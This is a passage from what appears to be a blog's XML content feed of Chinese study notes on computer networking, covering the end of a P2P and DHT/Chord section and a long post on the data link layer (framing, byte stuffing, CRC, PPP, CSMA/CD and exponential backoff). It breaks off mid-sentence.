小时。</p><p>看不懂？那就对了，我也看不懂（大佬给我走开），反正我就这样理解，如果采用传统的客户-服务器模式传输文件，那么你有几个主机需要文件，你就要和服务器建立几次连接，然后服务器上传文件，接着将服务器资源平均分给多台主机，然后传文件，而P2P则是服务器可以先传给一台（当然也可以多台），这时候服务器所有资源都可以给这一台主机（效率提高）单独传文件，然后服务器记录一下这台主机有这个资源，接着这台得到文件的主机可以通过服务器介绍和另外一台主机进行点对点连接传输文件，同时，服务器也可以继续和另一台传文件，如此下去，1变2，2变4，4变8，指数传递，效率提高，速度变快，服务器压力变小，一举多得啊。</p><h2 id="在-P2P-对等方中搜索对象"><a href="#在-P2P-对等方中搜索对象" class="headerlink" title="在 P2P 对等方中搜索对象"></a>在 P2P 对等方中搜索对象</h2><p>在前面我们知道：Napster在一个集中式目录服务器中构建的查找数据库虽然很简单，但性能上却有瓶颈。</p><p>Gnutella是一种采用全分布方法定位内容的P2P文件共享应用程序，它解决了集中式目录服务器所造成的瓶颈问题。然而Gnutella是在非结构化的覆盖网络中采用查询洪泛的方法来进行查找的，因此查找的效率较低。</p><p>现在广泛使用的索引和查找技术叫做分布式散列表 DHT (Distributed Hash Table)。DHT 也可译为分布式哈希表，它是由大量对等方共同维护的散列表。广泛使用的 Chord 算法是美国麻省理工大学于2001 年提出的。</p><p>分布式散列表 DHT 利用散列函数，把资源名 K 及其存放的结点 IP 地址 N 都分别映射为资源名标识符 KID 和结点标识符 NID。<br>Chord 把结点按标识符数值从小到大沿顺时针排列成一个环形覆盖网络。</p><p>如下图所示</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409162434921.png" alt="image-20210409162434921"></p><p>每个资源由 Chord 环上与其标识符值最接近的下一个结点提供服务。</p><p>当N13加进来到节点后，N10的下一个节点就会从N20变成N13，从而资源点标识符K12也会移至该N13上</p><p>但是这个速度还不够，为了加速查找，在 Chord 环上可以增加一些指针表(finger table)，它又称为路由表或查找器表。对于结点 N4， 第 1 列第 i  行计算（N4 + 2i – 1），得出后继结点。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409162724943.png" alt="image-20210409162724943"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-数据链路层</title>
      <link href="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<blockquote><p>注：内容根据《计算机网络第七版》以及相关PPT整理制作，图片主要源于{电子工程出版社}，部分图片源于学校老师上课所画的图以及自己制作的思维导图</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>首先看看不同定义下的计算机网络体系结构</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412184905304.png" alt="image-20210412184905304"></p><p>在OSI和五层协议里面，数据链路层都在其中扮演着重要的角色，在TCP/IP的体系结构里，数据链路层及以下则被抽象掉了</p><p>数据链路层是实现设备之间通信的非常重要的一层，不管经过的是什么网络，电话网、局域网、广域网等，需要注意的是：在里面，<strong>路由器在转发分组时只用到下三层协议</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412185205003.png" alt="image-20210412185205003"></p><p>再来看看处于交换机下的数据链路层</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412185623966.png" alt="image-20210412185623966"></p><p>若主机H1向H2发送数据，则实际上数据的流动是通过五层从左向右，从上向下传递过去的，但若只从数据链路层来看的话，数据是从H1→R1→R2→R2→R3→H2的链路层传过去的</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412185733062.png" alt="image-20210412185733062"></p><p>数据链路层使用的信道主要有以下两种类型</p><p>(a) <strong>点对点信道</strong>：这种信道使用一对一的点对点通信方式。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412190326192.png" alt="image-20210412190326192"></p><p>(b) <strong>广播信道</strong>：使用一对多的广播通信方式。必须使用专用的<strong>共享信道协议</strong>来协调这些主机的数据发送。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412190337871.png" alt="image-20210412190337871"></p><h1 id="使用点对点信道的数据链路层"><a href="#使用点对点信道的数据链路层" class="headerlink" title="使用点对点信道的数据链路层"></a>使用点对点信道的数据链路层</h1><h2 id="数据链路和帧"><a href="#数据链路和帧" class="headerlink" title="数据链路和帧"></a>数据链路和帧</h2><h3 id="链路和数据链路的区别"><a href="#链路和数据链路的区别" class="headerlink" title="链路和数据链路的区别"></a>链路和数据链路的区别</h3><p><strong>链路 (link)</strong> 是一条无源的点到点的物理线路段，中间没有任何其他的交换结点。<br>简单来说：一条链路只是一条通路的一个组成部分。</p><p><strong>数据链路 (data link)</strong> 除了物理线路外，还必须有<strong>通信协议</strong>来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。</p><p>现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。一般的适配器都包括了数据链路层和物理层这两层的功能。 </p><p>也有人采用另外的术语。这就是把链路分为<strong>物理链路</strong>和<strong>逻辑链路</strong>。<br>物理链路就是上面所说的链路。逻辑链路就是上面的数据链路，是物理链路加上必要的通信协议。</p><p>早期的数据通信协议曾叫做<strong>通信规程 (procedure)</strong>。因此在数据链路层，<strong>规程和协议是同义语</strong>。</p><h3 id="数据链路层传送的是帧"><a href="#数据链路层传送的是帧" class="headerlink" title="数据链路层传送的是帧"></a>数据链路层传送的是帧</h3><p>数据链路层通过将网络层传下来的ip数据包进行<strong>封装成帧</strong>然后再传给物理层，如下图所示</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412191405152.png" alt="image-20210412191405152"></p><p>通常，我们会在两个对等的数据链路层之间画出一个数字管道，而在这条数字管道上传输的数据单位是帧。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412191726824.png" alt="image-20210412191726824"></p><p>数据链路层不必考虑物理层如何实现比特传输的细节。甚至还可以更简单地设想好像是沿着两个数据链路层之间的水平方向把帧直接发送到对方。在之后的学习也是一样，随着往上层的学习，有时候为了屏蔽掉下层带给自己的干扰，我们大多时候会直接考虑数据是在对等层之间进行传递（实际上并不是）</p><p>数据链路层协议有许多种，但有三个基本问题则是共同的。这三个基本问题是：</p><ol><li><strong>封装成帧</strong></li><li><strong>透明传输</strong></li><li><strong>差错控制</strong> </li></ol><h2 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h2><p>封装成帧 (framing) 就是在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。</p><p>首部和尾部的一个重要作用就是进行帧定界。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412194144658.png" alt="image-20210412194144658"></p><p>当数据是由可打印的 ASCII 码组成的文本文件时，帧定界可以使用特殊的帧定界符。</p><p>控制字符 SOH (Start Of Header) 放在一帧的最前面，表示帧的首部开始。另一个控制字符 EOT (End Of Transmission) 表示帧的结束。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412194215116.png" alt="image-20210412194215116"></p><p>如果<strong>数据中</strong>的某个字节的<strong>二进制代码</strong>恰好和 SOH 或 EOT 一样，数据链路层就会错误地“找到帧的边界”。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412194504407.png" alt="image-20210412194504407"></p><p>为啥会出现这种情况呢，因为数据链路层在传递数据的时候是“透明”的，即透明传输</p><h2 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h2><blockquote><p>透明：指某一个实际存在的事物看起来却好像不存在一样。（想象一个完全透明的玻璃在你面前）</p></blockquote><p>“在数据链路层透明传送数据”表示无论发送什么样的比特组合的数据，这些数据都能够按照原样没有差错地通过这个数据链路层。这便是透明传输，也就是说，对面的数据链路层也会去解析你的整个帧，一不小心解析到了本存在于数据而不是帧定界的EOT时，就会误认终止而抛弃掉后面的帧</p><p>解决方法：<strong>字节填充 (byte stuffing)</strong> 或<strong>字符填充 (character stuffing)</strong>。</p><p>发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是1B)。接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。当接收端收到连续的两个转义字符时，就删除其中前面的一个。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412195139392.png" alt="image-20210412195139392"></p><h2 id="差错检错"><a href="#差错检错" class="headerlink" title="差错检错"></a>差错检错</h2><p>在传输过程中可能会产生比特差错：1 可能会变成 0， 而 0 也可能变成 1。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412195225962.png" alt="image-20210412195225962"></p><p>在一段时间内，传输错误的比特占所传输比特总数的比率称为<strong>误码率 BER (Bit Error Rate)。</strong></p><p>误码率与<strong>信噪比</strong>有很大的关系。</p><p>为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种<strong>差错检测</strong>措施。 下面介绍一种检测措施——循环循环冗余检验码</p><h3 id="循环冗余检验-CRC"><a href="#循环冗余检验-CRC" class="headerlink" title="循环冗余检验 CRC"></a>循环冗余检验 CRC</h3><p>在数据链路层传送的帧中，广泛使用了<strong>循环冗余检验 CRC</strong> 的<strong>检错技术。</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412195833103.png" alt="image-20210412195833103"></p><p>在发送端，先把数据划分为组。假定每组 k 个比特。 </p><p>在每组 M 后面再添加供差错检测用的 n 位冗余码，然后一起发送出去。 </p><h3 id="冗余码的计算"><a href="#冗余码的计算" class="headerlink" title="冗余码的计算"></a>冗余码的计算</h3><p>用二进制的模 2 运算进行 2n 乘数据M 的运算，这相当于<strong>在 M 后面添加 n 个 0</strong>。</p><p>得到的 (k + n) 位的数除以事先选定好的长度为 (n + 1) 位的除数 P，得出商是 Q 而余数是 R，余数 R 比除数 P 少 1 位，即 R 是 n 位。 </p><p>将余数 R 作为冗余码拼接在数据 M 后面，一起发送出去。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412200326411.png" alt="image-20210412200326411"></p><p>接收端会对收到的每一帧进行 CRC 检验</p><p>(1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受 (accept)。</p><p>(2) 若余数 R ≠ 0，则判定这个帧有差错，就丢弃。<br>但这种检测方法并不能确定究竟是哪一个或哪几个比特出现了差错。</p><p>只要经过严格的挑选，并使用位数足够多的除数 P，那么出现检测不到的差错的概率就很小很小。 </p><h3 id="冗余码的计算举例"><a href="#冗余码的计算举例" class="headerlink" title="冗余码的计算举例"></a>冗余码的计算举例</h3><p>现在 k = 6, M = 101001。<br>设 n = 3, 除数 P = 1101，<br>被除数是 2的n次*M = 101001000。<br>模 2 运算的结果是：商 Q = 110101，余数 R = 001。<br>把余数 R 作为冗余码添加在数据 M 的后面发送出去。发送的数据是：2nM + R，即：101001001，共 (k + n) 位。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412200553273.png" alt="image-20210412200553273"></p><h3 id="帧检验序列-FCS"><a href="#帧检验序列-FCS" class="headerlink" title="帧检验序列 FCS"></a>帧检验序列 FCS</h3><p>在数据后面添加上的冗余码称为帧检验序列 FCS (Frame Check Sequence)。</p><p>循环冗余检验 CRC 和帧检验序列 FCS 并不等同。<br>CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。<br><strong>FCS 可以用 CRC 这种方法得出，但 CRC 并非用来获得 FCS 的唯一方法。</strong> </p><p>最后应当注意：仅用循环冗余检验 CRC 差错检测技术只能做到无差错接受 (accept)。</p><p>“无差错接受”是指：“凡是接受的帧（即不包括丢弃的帧），我们都能以非常接近于 1 的概率认为这些帧在传输过程中没有产生差错”。<br>也就是说：“凡是接收端数据链路层接受的帧都没有传输差错”（有差错的帧就丢弃而不接受）。单纯使用 CRC 差错检测技术不能实现“无差错传输”或“可靠传输”。</p><p>应当明确，<strong>“无比特差错”</strong>与<strong>“无传输差错”</strong>是不同的概念。在数据链路层使用 CRC 检验，能够实现无比特差错的传输，但这还不是可靠传输。要做到“无差错传输”（即发送什么就收到什么）就必须再加上<strong>确认和重传机制。</strong> 本章介绍的数据链路层协议都<strong>不是可靠传输</strong>的协议。</p><h1 id="点对点协议-PPP"><a href="#点对点协议-PPP" class="headerlink" title="点对点协议 PPP"></a>点对点协议 PPP</h1><h2 id="PPP-协议的特点"><a href="#PPP-协议的特点" class="headerlink" title="PPP 协议的特点"></a>PPP 协议的特点</h2><p>对于点对点的链路，目前使用得最广泛的数据链路层协议是点对点协议 PPP (Point-to-Point Protocol)。</p><p>PPP 协议在 1994 年就已成为互联网的正式标准。</p><p>用户到 ISP 的链路使用 PPP 协议 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412201655878.png" alt="用户到ISP的链路使用PPP协议 "></p><p><strong>PPP 协议应满足的需求</strong></p><ol><li><strong>简单 —— 这是首要的要求。</strong></li><li><strong>封装成帧</strong> —— 必须规定特殊的字符作为帧定界符。</li><li><strong>透明性</strong> —— 必须保证数据传输的透明性。</li><li>多种网络层协议 —— 能够在同一条物理链路上同时支持多种网络层协议。</li><li>多种类型链路 —— 能够在多种类型的链路上运行。</li><li><strong>差错检测</strong> —— 能够对接收端收到的帧进行检测，并立即丢弃有差错的帧。</li><li>检测连接状态 —— 能够及时自动检测出链路是否处于正常工作状态。</li><li>最大传送单元 —— 必须对每一种类型的点对点链路设置最大传送单元  MTU 的标准默认值，促进各种实现之间的互操作性。</li><li>网络层地址协商 —— 必须提供一种机制使通信的两个网络层实体能够通过协商知道或能够配置彼此的网络层地址。</li><li>数据压缩协商 —— 必须提供一种方法来协商使用数据压缩算法。</li></ol><p><strong>PPP 协议有三个组成部分：</strong></p><ol><li>一个将 IP 数据报封装到串行链路的方法。</li><li><strong>链路控制协议 LCP</strong> (Link Control Protocol)。</li><li><strong>网络控制协议 NCP</strong> (Network Control Protocol)。 </li></ol><h2 id="PPP-协议的帧格式"><a href="#PPP-协议的帧格式" class="headerlink" title="PPP 协议的帧格式"></a>PPP 协议的帧格式</h2><p>PPP 帧的首部和尾部分别为 4 个字段和 2 个字段。</p><p>标志字段 F = 0x7E （符号“0x”表示后面的字符是用十六进制表示。十六进制的 7E 的二进制表示是 01111110）。</p><p>地址字段 A 只置为 0xFF。地址字段实际上并不起作用。<br>控制字段 C 通常置为 0x03。</p><p><strong>PPP 是面向字节的，所有的 PPP 帧的长度都是整数字节。</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412202618347.png" alt="image-20210412202618347"></p><p>PPP 有一个 2 个字节的协议字段。其值<br>若为 0x0021，则信息字段就是 IP 数据报。<br>若为 0x8021，则信息字段是网络控制数据。<br>若为 0xC021，则信息字段是 PPP 链路控制数据。<br>若为 0xC023，则信息字段是鉴别数据。</p><p><strong>PPP在透明传输的相关问题</strong></p><p>当 PPP 用在异步传输时，就使用一种特殊的<strong>字符填充法</strong>。<br>当 PPP 用在同步传输链路时，协议规定采用硬件来完成<strong>比特填充</strong>（和 HDLC 的做法一样）。  </p><h3 id="字符填充法"><a href="#字符填充法" class="headerlink" title="字符填充法"></a>字符填充法</h3><p>将信息字段中出现的每一个 0x7E 字节转变成为 2 字节序列 (0x7D, 0x5E)。 </p><p>若信息字段中出现一个 0x7D 的字节, 则将其转变成为 2 字节序列 (0x7D, 0x5D)。</p><p>若信息字段中出现 ASCII 码的控制字符（即数值小于 0x20 的字符），则在该字符前面要加入一个 0x7D 字节，同时将该字符的编码加以改变。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412202818142.png" alt="image-20210412202818142"></p><h3 id="零比特填充"><a href="#零比特填充" class="headerlink" title="零比特填充"></a>零比特填充</h3><p>PPP 协议用在 SONET/SDH 链路时，使用同步传输（一连串的比特连续传送）。这时 PPP 协议采用零比特填充方法来实现透明传输。</p><p>在发送端，只要发现有 5 个连续 1，则立即填入一个 0。</p><p>接收端对帧中的比特流进行扫描。每当发现 5 个连续1时，就把这 5 个连续 1 后的一个 0 删除。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412202911660.png" alt="image-20210412202911660"></p><p> PPP是不提供使用序号和确认的可靠传输的，为什么呢，原因如下</p><ol><li>在数据链路层出现差错的概率不大时，使用比较简单的 PPP 协议较为合理。</li><li>在因特网环境下，PPP 的信息字段放入的数据是 IP  数据报。数据链路层的可靠传输并不能够保证网络层的传输也是可靠的。</li><li>帧检验序列 FCS 字段可保证无差错接受。</li></ol><h2 id="PPP-协议的工作状态"><a href="#PPP-协议的工作状态" class="headerlink" title="PPP 协议的工作状态"></a>PPP 协议的工作状态</h2><p>当用户拨号接入 ISP 时，路由器的调制解调器对拨号做出确认，并建立一条物理连接。</p><p>PC 机向路由器发送一系列的 LCP 分组（封装成多个 PPP 帧）。</p><p>这些分组及其响应选择一些 PPP 参数，并进行网络层配置，NCP 给新接入的 PC 机分配一个临时的 IP 地址，使 PC 机成为因特网上的一个主机。</p><p>通信完毕时，NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着，LCP 释放数据链路层连接。最后释放的是物理层的连接。</p><p>可见，PPP 协议已不是纯粹的数据链路层的协议，它还包含了物理层和网络层的内容。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412203110510.png" alt="image-20210412203110510"></p><h1 id="使用广播信道的数据链路层"><a href="#使用广播信道的数据链路层" class="headerlink" title="使用广播信道的数据链路层"></a>使用广播信道的数据链路层</h1><h2 id="局域网的数据链路层"><a href="#局域网的数据链路层" class="headerlink" title="局域网的数据链路层"></a>局域网的数据链路层</h2><p>局域网最主要的特点是：网络为一个单位所拥有；地理范围和站点数目均有限。 </p><p>局域网具有如下主要优点：</p><ol><li>具有广播功能，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。 </li><li>便于系统的扩展和逐渐地演变，各设备的位置可灵活调整和改变。</li><li>提高了系统的可靠性、可用性和残存性。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412203528660.png" alt="image-20210412203528660"></p><p>一开始因为技术原因，没办法制造出廉价的集线器，所以采用的是总线型的局域网，这样的类型有着如下特点：各个主机是在一同条信道上进行通信的，使用一对多的广播通信方式。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412203948749.png" alt="image-20210412203948749"></p><p>但是它存在着问题：若多个设备在共享的广播信道上同时发送数据，则会造成彼此干扰，导致发送失败。</p><p>共享信道要考虑的便是如何让众多用户能够合理方便的共享通信媒体资源，总的分为两种方法</p><ol><li><p>静态划分信道（物理层）</p><ul><li>频分复用</li><li>时分复用</li><li>波分复用</li><li>码分复用 </li></ul></li><li><p>动态媒体接入控制（多点接入）</p><ul><li>随机接入</li><li>受控接入 ，如多点线路探询 (polling)，或轮询。      </li></ul></li></ol><h3 id="以太网的两个标准"><a href="#以太网的两个标准" class="headerlink" title="以太网的两个标准"></a><strong>以太网的两个标准</strong></h3><p> DIX Ethernet V2 是世界上第一个局域网产品（以太网）的规约。<br>IEEE 802.3 是第一个 IEEE 的以太网标准。</p><p>DIX Ethernet V2 标准与 IEEE 的 802.3 标准只有很小的差别，因此可以将 802.3 局域网简称为“以太网”。</p><p>严格说来，“以太网”应当是指符合 DIX Ethernet V2 标准的局域网 。</p><h3 id="数据链路层的两个子层"><a href="#数据链路层的两个子层" class="headerlink" title="数据链路层的两个子层"></a><strong>数据链路层的两个子层</strong></h3><p>为了使数据链路层能更好地适应多种局域网标准，IEEE 802 委员会就将局域网的数据链路层拆成两个子层：</p><ol><li><p>逻辑链路控制 LLC (Logical Link Control)子层；</p></li><li><p>媒体接入控制 MAC (Medium Access Control)子层。</p></li></ol><p>与接入到传输媒体有关的内容都放在 MAC子层，而 LLC 子层则与传输媒体无关。不管采用何种协议的局域网，对 LLC 子层来说都是透明的（有点像TCP/IP协议）。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412204812504.png" alt="image-20210412204812504"></p><p>由于 TCP/IP 体系经常使用的局域网是 DIX Ethernet V2 而不是802.3 标准中的几种局域网，因此现在 802 委员会制定的逻辑链路控制子层 LLC（即 802.2 标准）的作用已经不大了。很多厂商生产的适配器上就仅装有 MAC 协议而没有 LLC 协议。 </p><h3 id="适配器（网卡）"><a href="#适配器（网卡）" class="headerlink" title="适配器（网卡）"></a>适配器（网卡）</h3><blockquote><p>网络接口板又称为通信适配器 (adapter) 或网络接口卡 NIC (Network Interface Card)，或“网卡”。 </p></blockquote><p>适配器的重要功能：</p><ol><li>进行串行/并行转换。</li><li>对数据进行缓存。</li><li>在计算机的操作系统安装设备驱动程序。</li><li>实现以太网协议。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412204941268.png" alt="image-20210412204941268"></p><p>当适配器收到正确的帧时，它就会使用中断来通知计算机，并交付给协议栈中的网络层；这里值得注意的是：当收到的是有差错的帧时，适配器会直接丢掉该帧而不会去通知计算机。当计算机要发送ip数据包时，就由协议栈把IP数据包下交给适配器，组装成帧后发送到局域网。</p><h2 id="CSMA-CD-协议"><a href="#CSMA-CD-协议" class="headerlink" title="CSMA/CD 协议"></a>CSMA/CD 协议</h2><p>最初的以太网是将许多计算机都连接到一根总线上。易于实现<strong>广播通信</strong>。当初认为这样的连接方法既简单又可靠，因为总线上没有有源器件（当时普遍认为有源器件不可靠，无源的电缆线才是最可靠的）。</p><p> 为了实现一对一通信，将接收站的硬件地址写入帧首部中的目的地址字段中。仅当数据帧中的目的地址与适配器的硬件地址一致时，才能接收这个数据帧。比如下图中的B向D发送数据</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412205728382.png" alt="image-20210412205728382"></p><p>总线当然也有缺点。就像前面说的，若多台计算机或多个站点同时发送时，会产生发送碰撞或冲突，导致发送失败。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412205830005.png" alt="image-20210412205830005"></p><p>在讨论解决冲突或碰撞的方法前，先来看看以太网采取的两种重要的措施</p><p><strong>(1) 采用较为灵活的无连接的工作方式</strong></p><p>不必先建立连接就可以直接发送数据。对发送的数据帧不进行编号，也不要求对方发回确认。这样做的理由是局域网信道的质量很好，因信道质量产生差错的概率是很小的。</p><p>以太网提供的服务是不可靠的交付，即尽最大努力的交付。当目的站收到有差错的数据帧时就丢弃此帧，其他什么也不做。差错的纠正由高层来决定。</p><p>而如果高层发现丢失了一些数据而进行重传，此时以太网并不知道这是一个重传的帧，而是当作一个新的数据帧来发送。 </p><p><strong>(2) 以太网发送的数据都使用曼彻斯特 (Manchester) 编码</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412210100341.png" alt="image-20210412210100341"></p><p>曼彻斯特编码缺点是：它所占的频带宽度比原始的基带信号增加了一倍。</p><p>下面就介绍碰撞或冲突的解决方法</p><h3 id="CSMA-CD-协议要点（多点接入、载波监听、碰撞检测）"><a href="#CSMA-CD-协议要点（多点接入、载波监听、碰撞检测）" class="headerlink" title="CSMA/CD 协议要点（多点接入、载波监听、碰撞检测）"></a>CSMA/CD 协议要点（多点接入、载波监听、碰撞检测）</h3><p><strong>CSMA/CD 含义：载波监听多点接入 / 碰撞检测  (Carrier Sense Multiple Access with Collision Detection) 。</strong></p><p><strong>“多点接入”</strong>表示许多计算机以多点接入的方式连接在一根总线上。</p><p><strong>“载波监听”是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。</strong> </p><p>总线上并没有什么“载波”。因此， “载波监听”就是用电子技术检测总线上有没有其他计算机发送的数据信号。</p><p>实际上，不管在发送前还是发送中，每个站必须不停地检测信道，那么在发送中站是如何检测的呢？</p><p><strong>“碰撞检测”就是站在发送数据过程中对信道进行监听的操作</strong></p><p><strong>“碰撞检测”</strong>就是计算机边发送数据边检测信道上的信号电压大小。<br>当几个站同时在总线上发送数据时，总线上的信号电压摆动值将会增大（互相叠加）。</p><p>当一个站检测到的信号电压摆动值超过一定的门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞。</p><p>所谓“碰撞”就是发生了冲突。因此“碰撞检测”也称为“冲突检测”。</p><p>在发生碰撞时，总线上传输的信号产生了严重的失真，无法从中恢复出有用的信息来。</p><p>每一个正在发送数据的站，一旦发现总线上出现了碰撞，就要立即停止发送，免得继续浪费网络资源，然后等待一段随机时间后再次发送。</p><p>CSMA/CD协议工作流程如下图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412224725977.png" alt="image-20210412224725977"></p><p>为何要进行碰撞检测？ 因为信号传播时延对载波监听产生了影响，比如你现在在开会，两个人都想发言，但你们都克制住了，因为有另一个人在发言，这时候你们采用的便是<strong>载波监听</strong>，等到他讲完了，你们两<strong>载波监听</strong>没有监听到有人在说话准备想讲时，你讲了出来，结果巧了，他也同时讲了出来，两句话便在传播上起了冲突，看似同个时间讲的，其实可能是你早了那么几毫秒讲，但同时他的<strong>载波监听</strong>刚返回确认没有声音传出，他也开讲。而在这时候，如果你们不在讲的时候采取<strong>碰撞检测</strong>，一方停止讲话，那么你们两个人的声音就会彼此“吵架”</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20210412224847718.png" alt="image-20210412224847718"></p><p>最先发送数据帧的站，在发送数据帧后至多经过时间 2r （两倍的端到端往返时延）就可知道发送的数据帧是否遭受了碰撞。</p><p>以太网的端到端往返时延 2r  称为争用期，或碰撞窗口。</p><p>经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。</p><h3 id="截断二进制指数退避算法"><a href="#截断二进制指数退避算法" class="headerlink" title="截断二进制指数退避算法"></a>截断二进制指数退避算法</h3><blockquote><p>以太网使用截断二进制指数退避算法来确定碰撞后重传的时机</p></blockquote><p>发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。</p><ol><li><p><strong>基本退避时间取为争用期 2я。</strong></p></li><li><p>从整数集合 [0, 1, … , (2k - 1)] 中随机地取出一个数，记为 r。重传所需的时延就是 <strong>r 倍</strong>的基本退避时间。</p></li><li><p>参数 k 按下面的公式计算：</p><blockquote><p>k = Min[重传次数, 10]</p></blockquote></li><li><p>当 k ≤10 时，参数 k 等于重传次数。</p></li><li><p>当重传达 16 次仍不能成功时即丢弃该帧，并向高层报告。 </p></li></ol><p>举个栗子<br>第 1 次冲突重传时：<br>    k = 1，r 为 {0，1} 集合中的任何一个数。<br>第 2 次冲突重传时：<br>    k = 2，r 为 {0，1，2，3} 集合中的任何一个数。<br>第 3 次冲突重传时：<br>    k = 3，r 为 {0，1，2，3，4，5，6，7} 集合中的任何一个数。</p><h3 id="10-Mbit-s-以太网争用期的长度"><a href="#10-Mbit-s-以太网争用期的长度" class="headerlink" title="10 Mbit/s 以太网争用期的长度"></a><strong>10 Mbit/s 以太网争用期的长度</strong></h3><p>10 Mbit/s 